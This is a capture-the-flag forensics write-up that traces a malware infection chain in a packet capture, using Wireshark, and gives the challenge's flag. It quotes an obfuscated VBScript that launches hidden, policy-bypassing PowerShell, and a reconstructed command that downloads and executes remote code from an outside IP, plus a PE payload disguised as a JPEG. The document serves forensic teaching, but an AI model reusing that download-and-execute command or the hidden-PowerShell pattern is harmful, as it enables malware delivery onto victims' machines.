# Stage One

**Category:** Forensics
**Difficulty:** Medium
**Points:** 400 (Dynamic)
**Author:** Bilawal Ali
**Event:** AccessDenied CTF 2026

## Challenge Description

An attacker has gained unauthorized access to a system and initiated a malware infection chain. During the investigation, a first-stage payload was retrieved from an external source.

The objective is to analyze the available network artifacts, trace the attacker's activity, and identify the URL used to download the initial malware stage.

**Flag Format:**

```text
MUET{protocol://ip:port/file_name.extension}
```

## Provided File

```text
flag_file.pcap
```

**SHA1:**

```text
2cefb1b9c9ec982c2fbfa03f4a91a52e188bd1f3
```

## Solution

The PCAP contains HTTP traffic between the infected host and an external server. The investigation focuses on identifying the files transferred during the infection chain and determining which request retrieves the actual malware payload.

### 1. Identify Relevant Network Conversations

Open the capture in Wireshark and navigate to:

```text
Statistics → Conversations → IPv4
```

The relevant external communication is between:

```text
10.1.9.101
```

and:

```text
45.126.209.4
```

The internal host `10.1.9.101` is the affected system, while `45.126.209.4` is the external server involved in the malware download.

### 2. Filter HTTP Requests

Use the following Wireshark display filter:

```text
http.request
```

Two HTTP GET requests are observed:

```text
GET /xlm.txt HTTP/1.1
GET /mdm.jpg HTTP/1.1
```

Both requests are directed to:

```text
45.126.209.4:222
```

The request for `xlm.txt` occurs before the request for `mdm.jpg`, indicating a possible multi-stage download sequence.

### 3. Export the HTTP Objects

Wireshark can extract the transferred files directly.

Navigate to:

```text
File → Export Objects → HTTP
```

The capture contains two relevant objects:

| Host               | Content Type |         Size | File      |
| ------------------ | ------------ | -----------: | --------- |
| `45.126.209.4:222` | `text/plain` |   1974 bytes | `xlm.txt` |
| `45.126.209.4:222` | `image/jpeg` | 431208 bytes | `mdm.jpg` |

The filenames alone are not sufficient to determine the nature of the files, so both objects require further inspection.

### 4. Analyze `xlm.txt`

Follow the HTTP stream associated with:

```text
GET /xlm.txt
```

The response contains an obfuscated VBScript.

Part of the script executes PowerShell with hidden execution and bypass options:

```text
Set objShell = CreateObject("WScript.Shell")
objShell.Run "Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI " & OodjR, 0, True
```

The script constructs its command from multiple obfuscated string fragments.

After reconstructing the fragments and resolving the string substitution, the resulting PowerShell command is:

```text
IEX(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING('http://45.126.209.4:222/mdm.jpg')
```

This reveals the next stage of the infection chain.

The `xlm.txt` file is therefore acting as a downloader/dropper rather than being the final payload itself.

### 5. Analyze `mdm.jpg`

The second HTTP object is named:

```text
mdm.jpg
```

and is presented as:

```text
Content-Type: image/jpeg
```

However, inspecting the actual response content reveals PowerShell code containing a large hexadecimal string:

```text
$Content = @'
$hexString_bbb = "4D_5A_90_00_03_00_00_00_04_00_00_00..."
```

The first two bytes are:

```text
4D 5A
```

These correspond to the `MZ` signature used at the beginning of Windows PE executables.

This indicates that `mdm.jpg` is not a genuine JPEG image. The file contains a Windows executable payload disguised as an image.

The PowerShell code reconstructs the executable from the hexadecimal representation.

Therefore, `mdm.jpg` represents the actual malware payload retrieved by the downloader.

### 6. Determine the Download URL

The reconstructed PowerShell command provides the complete URL:

```text
http://45.126.209.4:222/mdm.jpg
```

Breaking it down:

| Component  | Value          |
| ---------- | -------------- |
| Protocol   | `http`         |
| IP address | `45.126.209.4` |
| Port       | `222`          |
| File       | `/mdm.jpg`     |

The flag is therefore:

```text
MUET{http://45.126.209.4:222/mdm.jpg}
```

## Infection Chain

The observed sequence can be summarized as:

```text
10.1.9.101
     |
     | GET /xlm.txt
     v
45.126.209.4:222
     |
     | Obfuscated VBScript
     |
     | PowerShell DownloadString()
     v
45.126.209.4:222
     |
     | GET /mdm.jpg
     v
PE payload disguised as JPEG
```

The important distinction is that `/xlm.txt` is the initial downloader script, while `/mdm.jpg` is the executable payload that the downloader retrieves.

## Wireshark Features Used

* **Statistics → Conversations → IPv4** — identify relevant hosts
* **`http.request`** — isolate HTTP requests
* **File → Export Objects → HTTP** — extract transferred files
* **Follow → HTTP Stream** — inspect HTTP request and response content

## Key Findings

* The infected host communicated with an external server at `45.126.209.4`.
* The server was listening on HTTP port `222`.
* `xlm.txt` contained an obfuscated VBScript downloader.
* The downloader executed PowerShell using `Net.WebClient.DownloadString()`.
* The PowerShell code requested `/mdm.jpg`.
* Despite its `.jpg` extension, the payload contained the `MZ` signature of a Windows PE executable.
* The final payload download URL was recovered from the PowerShell command.

## Key Takeaways

Network captures can provide enough evidence to reconstruct a malware infection chain without executing the recovered payload.

File names and HTTP content types should not be trusted on their own. The actual contents of transferred objects should be inspected to determine their true nature.

When investigating a multi-stage malware infection, it is important to follow the execution chain rather than stopping at the first suspicious artifact. In this case, the initial script points to the second-stage payload, which provides the URL required by the challenge.
